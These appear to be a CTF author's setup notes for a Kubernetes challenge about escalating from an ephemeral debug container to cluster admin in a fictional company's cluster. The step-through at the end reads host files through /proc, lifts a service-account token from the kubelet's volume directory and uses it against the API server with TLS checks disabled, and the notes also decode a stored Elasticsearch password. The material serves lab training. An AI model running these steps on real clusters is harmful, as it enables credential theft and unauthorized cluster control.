# Capture the Flag - TBD (ephemerial container to cluster admin)

## Overview

Compromised company - Coastline Data (CD)

## Notes

```bash
gcloud container clusters create kgw-ctf2023-testing --enable-autoupgrade --num-nodes=2 --cluster-version=1.24.8-gke.2000
```

```bash
gcloud container clusters get-credentials kgw-ctf2023-testing
```

### Ephemeral Container Attachment

```bash
kubectl debug -it --attach=false -c debugger --image=ttl.sh/kctl-48fg-43fasf:6h $POD -n coastline
```

```bash
kubectl attach -it -c debugger $POD -n coastline
```


### Elastic Search

> took a minute and half for the operator to deploy ES

```bash
kubectl get secret coastline-es-elastic-user -o go-template='{{.data.elastic | base64decode}}'
```

### TBD

* Remove master-0 from pv (done)
* operator scheduled on node (done)
* another deployment with sharepidnamespace false (done)
* token request api (get list sa) (done)
* couldn't get the sa to work so I've added access to service accounts and use their tokens (log)
* change daemonset name for coastline (done)

- apiGroups:
  - authentication.k8s.io/v1
  resources:
  - serviceaccount/token
  verbs:
  - create

/proc/18/root/host/var/lib/kubelet/

## Step through

kubectl get pods -n coastline
export POD=data-burrow-dev-<uid>
kubectl debug -it --attach=false -c debugger --image=<image> $POD -n coastline
kubectl attach -it -c debugger $POD -n coastline
#attached to pod
cat /proc/<hydrelaps-pid>/root/host/root/flag.txt
cd /proc/19/root/host/var/lib/kubelet/pods/<uid>/volumes/kubernetes.io~projected/kube-api-access-<uid>/
export TOKEN=$(cat token)
env #for api-server ip
kubectl get pods -n kube-system --token=$TOKEN --server=https://<server-ip>:443 --insecure-skip-tls-verify
